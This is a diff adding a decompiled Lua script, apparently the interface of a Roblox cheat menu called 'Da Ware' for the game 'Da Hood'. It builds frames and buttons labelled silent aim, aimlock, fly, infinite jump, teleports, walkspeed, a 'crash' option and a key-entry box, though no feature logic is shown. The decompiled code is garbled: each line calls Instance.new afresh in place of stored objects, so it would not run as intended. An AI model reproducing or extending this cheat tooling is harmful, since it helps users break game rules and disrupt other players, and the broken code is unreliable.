@@ -1,0 +1,2893 @@
+--[[
+  Decompiled using Federal#9999's decompiler. Output might not be 100% accurate 
+]]
+
+Instance.new("ScreenGui").Parent = game.CoreGui
+Instance.new("ScreenGui").ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("ScreenGui"), "Main"
+Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").BorderColor3 = Color3.fromRGB(21, 32, 193)
+Instance.new("Frame").Position = UDim2.new(0.281619489, 0, 0.304458588, 0)
+Instance.new("Frame").Size = UDim2.new(0, 540, 0, 335)
+Instance.new("Frame").Visible = false
+Instance.new("TextLabel").Parent, Instance.new("TextLabel").Name = Instance.new("Frame"), "LABEL DA WARE"
+Instance.new("TextLabel").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextLabel").BorderColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextLabel").Position = UDim2.new(-0.00158273207, 0, 0, 0)
+Instance.new("TextLabel").Size = UDim2.new(0, 540, 0, 35)
+Instance.new("TextLabel").Font = Enum.Font.PermanentMarker
+Instance.new("TextLabel").Text = "DA WARE (c and v to toggle)"
+Instance.new("TextLabel").TextColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("TextLabel").TextScaled = true
+Instance.new("TextLabel").TextSize = 14
+Instance.new("ScrollingFrame").Parent, Instance.new("TextLabel").TextWrapped = Instance.new("Frame"), true
+Instance.new("ScrollingFrame").Active = true
+Instance.new("ScrollingFrame").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("ScrollingFrame").BorderColor3 = Color3.fromRGB(21, 32, 193)
+Instance.new("ScrollingFrame").Position = UDim2.new(-0.00158273207, 0, 0.114379063, 0)
+Instance.new("ScrollingFrame").Size = UDim2.new(0, 109, 0, 296)
+Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "k"
+Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("Frame").BorderColor3 = Color3.fromRGB(21, 32, 193)
+Instance.new("Frame").Position = UDim2.new(0.200269118, 0, 0.114379063, 0)
+Instance.new("TextButton").Parent, Instance.new("Frame").Size = Instance.new("Frame"), UDim2.new(0, 431, 0, 295)
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.00787661131, 0, 0.219330862, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 119, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "Walkspeed cant toggle for now"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.34630546, 0, 0.219330832, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 119, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "Headless - not fe"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.347607046, 0, 0.0371747203, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 119, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "Korblox"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.34630546, 0, 0.386617124, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 119, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "Inf jump"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.00755673647, 0, 0.386617094, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 119, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "Fly - FOR MOBILE"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextLabel").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextLabel").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextLabel").BorderColor3 = Color3.fromRGB(21, 32, 193)
+Instance.new("TextLabel").Position = UDim2.new(0, 0, 0.609665453, 0)
+Instance.new("TextLabel").Size = UDim2.new(0, 395, 0, 30)
+Instance.new("TextLabel").Font = Enum.Font.Nunito
+Instance.new("TextLabel").Text = "Selling tools below"
+Instance.new("TextLabel").TextColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("TextLabel").TextScaled = true
+Instance.new("TextLabel").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextLabel").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.0251889173, 0, 0.773234189, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 106, 0, 24)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Raycodex Drop"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextSize = Instance.new("Frame"), 14
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.327455908, 0, 0.773234189, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 96, 0, 24)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Anti- afk"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextSize = Instance.new("Frame"), 14
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.619647384, 0, 0.773234189, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 105, 0, 24)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Swag mode crash"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("ImageLabel").Parent, Instance.new("TextButton").TextSize = Instance.new("Frame"), 14
+Instance.new("ImageLabel").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("ImageLabel").BackgroundTransparency = 1
+Instance.new("ImageLabel").Position = UDim2.new(0.722921908, 0, 0.0260223057, 0)
+Instance.new("ImageLabel").Size = UDim2.new(0, 93, 0, 90)
+Instance.new("TextLabel").Parent, Instance.new("ImageLabel").Image = Instance.new("Frame"), "rbxasset://textures/ui/GuiImagePlaceholder.png"
+Instance.new("TextLabel").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextLabel").BorderColor3 = Color3.fromRGB(21, 32, 193)
+Instance.new("TextLabel").Position = UDim2.new(0.762057424, 0, 0.904663086, 0)
+Instance.new("TextLabel").Size = UDim2.new(0, 127, 0, 31)
+Instance.new("TextLabel").Font = Enum.Font.SourceSans
+Instance.new("TextLabel").Text = "Owner Mason?#7777"
+Instance.new("TextLabel").TextColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("TextLabel").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "Legit"
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.00831826776, 0, 0.46405229, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 81, 0, 38)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "lock and silent"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "Visuals"
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.0142589295, 0, 0.14705883, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 75, 0, 38)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Main"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "Misc"
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.0142589295, 0, 0.307189584, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 75, 0, 38)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Tab2"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(247, 247, 247)
+Instance.new("TextButton").TextSize = 14
+Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "LegitTab"
+Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("Frame").BorderColor3 = Color3.fromRGB(21, 32, 193)
+Instance.new("Frame").Position = UDim2.new(0.206555799, 0, 0.114379063, 0)
+Instance.new("Frame").Size = UDim2.new(0, 428, 0, 296)
+Instance.new("Frame").Visible = false
+Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "no circle"
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").Position = UDim2.new(0.0302267, 0, 0.054854162, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 119, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "Silent aim witout circle (gui)"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.0210447311, 0, 0.76752764, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 73, 0, 18)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "DB TELEPORT"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextSize = Instance.new("Frame"), 14
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.232631624, 0, 0.76752764, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 73, 0, 18)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Rev Teleport"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextSize = Instance.new("Frame"), 14
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.234256938, 0, 0.883728921, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 73, 0, 20)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Admin base"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextSize = Instance.new("Frame"), 14
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").BorderColor3 = Color3.fromRGB(9, 24, 42)
+Instance.new("TextButton").Position = UDim2.new(0.438287169, 0, 0.767527699, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 73, 0, 18)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Rpg Teleport"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextSize = Instance.new("Frame"), 14
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.440806061, 0, 0.881918848, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 73, 0, 18)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Bank teleport"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextSize = Instance.new("Frame"), 14
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.336200207, 0, 0.217442825, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 119, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "Animations"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.340589434, 0, 0.0519022197, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 119, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "Fly - X"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextLabel").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextLabel").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextLabel").BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextLabel").Position = UDim2.new(0.022670025, 0, 0.605166078, 0)
+Instance.new("TextLabel").Size = UDim2.new(0, 389, 0, 30)
+Instance.new("TextLabel").Font = Enum.Font.Nunito
+Instance.new("TextLabel").Text = "Teleports"
+Instance.new("TextLabel").TextColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("TextLabel").TextScaled = true
+Instance.new("TextLabel").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextLabel").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.662468553, 0, 0.767527699, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 73, 0, 18)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "buy Armor"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextSize = Instance.new("Frame"), 14
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.662468553, 0, 0.881918788, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 73, 0, 18)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Taco Shop"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextSize = Instance.new("Frame"), 14
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.0285035633, 0, 0.217241377, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 119, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.Merriweather
+Instance.new("TextButton").Text = "Silent aimlock - q reccomended"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.0265833139, 0, 0.382781923, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 119, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.Merriweather
+Instance.new("TextButton").Text = "FE flip - X - Z  - C"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.0226700306, 0, 0.883728921, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 73, 0, 21)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Flame Teleport"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextSize = 14
+Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "VisualsTab"
+Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("Frame").BorderColor3 = Color3.fromRGB(21, 32, 193)
+Instance.new("Frame").Position = UDim2.new(0.207272053, 0, 0.104477614, 0)
+Instance.new("Frame").Size = UDim2.new(0, 426, 0, 299)
+Instance.new("Frame").Visible = false
+Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "FOV 120"
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.0521149747, 0, 0.0739511028, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 120, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "FOV = 120"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").TextWrapped = true
+Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "FIV 90"
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.0532119945, 0, 0.216201156, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 120, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "FOV = 90"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").TextWrapped = true
+Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "FOV 180"
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.69584018, 0, 0.0732677579, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 120, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "FOV = 180"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").BorderColor3 = Color3.fromRGB(27, 42, 53)
+Instance.new("TextButton").Position = UDim2.new(0.38464874, 0, 0.0722860396, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 120, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "FOV = 70 (NORMAL FOV)"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.377088398, 0, 0.212515965, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 120, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "FOV = 50"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(60, 148, 255)
+Instance.new("TextButton").Position = UDim2.new(0.692102492, 0, 0.210304782, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 120, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "CLICK TP - T"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(255, 88, 88)
+Instance.new("TextButton").Position = UDim2.new(0.0513789728, 0, 0.344744593, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 120, 0, 28)
+Instance.new("TextButton").Font = Enum.Font.PermanentMarker
+Instance.new("TextButton").Text = "Walkspeed (Fixed)"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").TextWrapped = true
+Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("ScreenGui"), "KeyFrame"
+Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").BorderColor3 = Color3.fromRGB(255, 46, 46)
+Instance.new("Frame").Position = UDim2.new(0.329025775, 0, 0.329936266, 0)
+Instance.new("ImageLabel").Parent, Instance.new("Frame").Size = Instance.new("Frame"), UDim2.new(0, 534, 0, 347)
+Instance.new("ImageLabel").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("ImageLabel").BackgroundTransparency = 1
+Instance.new("ImageLabel").BorderColor3 = Color3.fromRGB(255, 46, 46)
+Instance.new("ImageLabel").Position = UDim2.new(0.389302015, 0, 0.170028806, 0)
+Instance.new("ImageLabel").Size = UDim2.new(0, 141, 0, 133)
+Instance.new("ImageLabel").Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("ImageLabel"), UDim.new(0, 34234)
+Instance.new("TextLabel").Parent, Instance.new("TextLabel").Name = Instance.new("Frame"), "Title"
+Instance.new("TextLabel").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextLabel").BorderColor3 = Color3.fromRGB(255, 46, 46)
+Instance.new("TextLabel").Size = UDim2.new(0, 534, 0, 50)
+Instance.new("TextLabel").Font = Enum.Font.SourceSans
+Instance.new("TextLabel").Text = ""
+Instance.new("TextLabel").TextColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("TextLabel").TextScaled = true
+Instance.new("TextLabel").TextSize = 14
+Instance.new("TextLabel").TextStrokeColor3 = Color3.fromRGB(255, 14, 14)
+Instance.new("TextLabel").TextWrapped = true
+Instance.new("UIGradient").Parent, Instance.new("UIGradient").Color = Instance.new("TextLabel"), ColorSequence.new({
+  ColorSequenceKeypoint.new(0, Color3.fromRGB(42, 81, 255)),
+  ColorSequenceKeypoint.new(0.08, Color3.fromRGB(255, 78, 34)),
+  ColorSequenceKeypoint.new(0.24, Color3.fromRGB(144, 255, 92)),
+  ColorSequenceKeypoint.new(0.36, Color3.fromRGB(255, 21, 142)),
+  ColorSequenceKeypoint.new(0.46, Color3.fromRGB(161, 255, 252)),
+  ColorSequenceKeypoint.new(0.55, Color3.fromRGB(5, 255, 21)),
+  ColorSequenceKeypoint.new(0.68, Color3.fromRGB(255, 85, 85)),
+  ColorSequenceKeypoint.new(0.77, Color3.fromRGB(255, 0, 0)),
+  [56] = ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+})
+Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "Check"
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").BorderColor3 = Color3.fromRGB(255, 46, 46)
+Instance.new("TextButton").Position = UDim2.new(0.0454644263, 0, 0.769138336, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 200, 0, 50)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Da ware (da hood)"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextBox").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextBox").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextBox").BorderColor3 = Color3.fromRGB(255, 46, 46)
+Instance.new("TextBox").Position = UDim2.new(0.317000002, 0, 0.581818402, 0)
+Instance.new("TextBox").Size = UDim2.new(0, 200, 0, 40)
+Instance.new("TextBox").Font = Enum.Font.SourceSans
+Instance.new("TextBox").Text = "Key here"
+Instance.new("TextBox").TextColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("TextBox").TextScaled = true
+Instance.new("TextBox").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextBox").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").BorderColor3 = Color3.fromRGB(255, 46, 46)
+Instance.new("TextButton").Position = UDim2.new(0.567415714, 0, 0.766570628, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 200, 0, 50)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Da ware (modded)"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").TextWrapped = true
+Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("ScreenGui"), "DHMGUI"
+Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").Position = UDim2.new(0.344382942, 0, 0.364331126, 0)
+Instance.new("Frame").Size = UDim2.new(0, 532, 0, 342)
+Instance.new("ScrollingFrame").Parent, Instance.new("Frame").Visible = Instance.new("Frame"), false
+Instance.new("ScrollingFrame").Active = true
+Instance.new("ScrollingFrame").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("ScrollingFrame").BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("ScrollingFrame").Position = UDim2.new(0, 0, 0.146198824, 0)
+Instance.new("TextLabel").Parent, Instance.new("ScrollingFrame").Size = Instance.new("Frame"), UDim2.new(0, 111, 0, 292)
+Instance.new("TextLabel").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextLabel").BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextLabel").Size = UDim2.new(0, 532, 0, 50)
+Instance.new("TextLabel").Font = Enum.Font.SourceSans
+Instance.new("TextLabel").Text = "Da Ware V.1.3"
+Instance.new("TextLabel").TextColor3 = Color3.fromRGB(237, 30, 255)
+Instance.new("TextLabel").TextScaled = true
+Instance.new("TextLabel").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextLabel").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0244360901, 0, 0.298245609, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 71, 0, 25)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
